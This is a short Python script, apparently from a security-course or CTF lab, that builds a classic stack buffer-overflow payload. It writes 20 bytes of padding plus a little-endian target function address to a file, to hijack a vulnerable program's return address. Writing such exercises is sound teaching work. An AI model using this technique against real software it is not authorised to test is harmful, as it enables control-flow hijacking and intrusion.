# attack.py
import sys

def create_attack_string(func_addr_hex):
    # Convert target address to little-endian bytes
    addr = bytes.fromhex(func_addr_hex)[::-1]  # e.g., 08049196 → \x96\x91\x04\x08
    padding = b'A' * 20  # 20 bytes to overwrite buffer + padding + saved EBP
    payload = padding + addr

    with open('attack_string', 'wb') as f:
        f.write(payload)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 attack.py <target_function_address>")
        sys.exit(1)
    func_addr_hex = sys.argv[1]
    create_attack_string(func_addr_hex)